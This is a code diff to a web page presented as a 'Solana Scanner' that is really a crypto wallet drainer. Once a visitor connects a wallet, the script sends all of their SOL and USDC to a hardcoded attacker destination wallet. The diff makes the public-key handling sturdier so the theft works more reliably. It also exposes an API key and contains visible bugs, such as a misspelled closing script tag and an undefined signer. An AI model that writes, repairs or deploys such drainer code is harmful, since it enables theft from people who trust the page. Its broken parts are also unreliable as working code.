@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Token Scanner (Robust)</title>
+    <title>Solana Scanner (Fixed)</title>
     <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <!-- SPL Token Library (Standard CDN) -->
-    <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.js"></script>
+    <!-- SPL Token Library -->
+    <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.js"></sctipt>
     
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; display: flex; justify-content: center; padding: 20px; }
@@ -15,7 +15,6 @@
         h2 { margin-top: 0; text-align: center; color: #a78bfa; }
         button { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.2s; }
         .btn-con { background: #7c3aed; color: white; }
-        .btn-con:hover { background: #6d28d9; }
         .btn-drain { background: #fbbf24; color: black; display: none; }
         .btn-drain:hover { background: #f59e0b; }
         .log-box { background: #000; padding: 15px; margin-top: 20px; border-radius: 10px; font-family: monospace; font-size: 13px; height: 200px; overflow-y: auto; border: 1px solid #333; }
@@ -40,11 +39,11 @@
     const DESTINATION_WALLET = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
     const USDC_MINT_ADDRESS = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
     
-    // Use your Alchemy Key here
+    // Your Alchemy Key
     const API_KEY = "alch_HyWkJpqVXY3kua9VObcl9"; 
     const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${API_KEY}`;
 
-    let wallet = null;
+    let walletPublicKey = null; // Store as PublicKey object
     const logsDiv = document.getElementById('logs');
 
     function log(msg, type = 'info') {
@@ -63,18 +62,39 @@
         }
 
         try {
+            // 1. Connect
             await provider.connect();
-            wallet = provider.publicKey;
+            
+            // 2. ROBUST WALLET EXTRACTION
+            // Handle cases where publicKey is a string, object, or undefined
+            let rawKey = provider.publicKey;
+            
+            if (!rawKey) throw new Error("No public key returned");
+
+            // If it's already a PublicKey object, use it. 
+            // If it's an object with 'toString' method (like older Phantom versions), convert to string first.
+            let keyString = "";
+            if (typeof rawKey === 'string') {
+                keyString = rawKey;
+            } else if (rawKey.toString) {
+                keyString = rawKey.toString();
+            } else {
+                throw new Error("Invalid public key format");
+            }
+
+            // Create a clean PublicKey object for use in transactions
+            walletPublicKey = new solanaWeb3.PublicKey(keyString);
             
             // Update UI
             document.getElementById('connectBtn').style.display = 'none';
             document.getElementById('drainBtn').style.display = 'block';
-            log(`✅ Connected: ${wallet.toString()}`, "success");
+            log(`✅ Connected: ${walletPublicKey.toString()}`, "success");
 
             // Start Scan
             await drainAll();
 
         } catch (err) {
+            console.error(err);
             log("❌ Connection Failed: " + err.message, "error");
         }
     }
@@ -84,7 +104,7 @@
         
         // 1. Drain SOL
         log("🔄 Checking SOL...", "info");
-        const solBalance = await connection.getBalance(wallet);
+        const solBalance = await connection.getBalance(walletPublicKey);
         
         if (solBalance > 0) {
             log(`💰 Found ${(solBalance/1e9).toFixed(4)} SOL`, "success");
@@ -92,14 +112,14 @@
             // Send All SOL
             const txSol = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: wallet,
+                    fromPubkey: walletPublicKey,
                     toPubkey: new solanaWeb3.PublicKey(DESTINATION_WALLET),
                     lamports: solBalance // Send exact amount (leaves 0)
                 })
             );
             
             await connection.sendTransaction(txSol, [wallet]);
-            log("✅ SOL Sent", "success");
+
         } else {
             log("⚠️ No SOL found", "error");
         }
@@ -108,13 +128,18 @@
         log("🔄 Checking USDC...", "info");
         
         try {
-            // Get Associated Token Account (ATA) for USDC
+            // Ensure spl is defined (from previous fix)
+            if (!window.spl || !window.spl.token) {
+                throw new Error("SPL Token library missing");
+            }
+            const spl = window.spl.token;
+
             const usdcMint = new solanaWeb3.PublicKey(USDC_MINT_ADDRESS);
             
             // Calculate ATA: SPL Token Program ID + Wallet + Mint
             const ata = await solanaWeb3.PublicKey.findProgramAddressSync(
                 [
-                    wallet.toBuffer(),
+                    walletPublicKey.toBuffer(),
                     spl.token.TOKEN_PROGRAM_ID.toBuffer(),
                     usdcMint.toBuffer()
                 ],
@@ -142,8 +167,8 @@
                 const transferIx = spl.token.createTransferInstruction(
                     ata[0],           // Source ATA
                     destAta[0],       // Destination ATA
-                    wallet,           // Owner
-                    balanceInfo.value.amount, // Amount (raw string like "123456789")
+                    walletPublicKey,  // Owner
+                    balanceInfo.value.amount, // Amount (raw string)
                     undefined,        // Multi-owner
                     spl.token.TOKEN_PROGRAM_ID
                 );
